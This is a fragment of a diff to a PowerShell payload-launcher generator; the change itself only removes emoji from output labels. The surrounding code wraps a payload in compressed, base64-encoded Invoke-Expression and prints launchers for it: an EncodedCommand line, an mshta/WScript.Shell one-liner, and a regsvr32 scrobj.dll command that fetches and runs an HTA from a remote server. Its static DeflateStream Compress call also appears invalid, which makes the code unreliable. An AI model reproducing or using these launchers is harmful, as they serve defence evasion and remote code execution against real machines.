@@ -123,14 +123,14 @@ $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
 "Invoke-Expression (New-Object IO.StreamReader ([IO.Compression.DeflateStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String(`"$([Convert]::ToBase64String([IO.Compression.DeflateStream]::Compress([Text.Encoding]::UTF8.GetBytes(`"$dec`"))))`")), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
 ))
 
-Write-Host "`n📎 EncodedCommand Launcher:"
+Write-Host "`n EncodedCommand Launcher:"
 Write-Host "powershell.exe -EncodedCommand $encoded`n"
 
 # mshta
 $hta = "mshta javascript:eval('new ActiveXObject(\"WScript.Shell\").Run(\"powershell -EncodedCommand $encoded\")')"
-Write-Host "🧬 mshta Launcher:"
+Write-Host " mshta Launcher:"
 Write-Host $hta
 
 # regsvr32
-Write-Host "`n⚙️ regsvr32 Launcher (host HTA on remote server):"
+Write-Host "`n regsvr32 Launcher (host HTA on remote server):"
 Write-Host "regsvr32 /u /n /s /i:http://yourserver.com/drop.hta scrobj.dll"
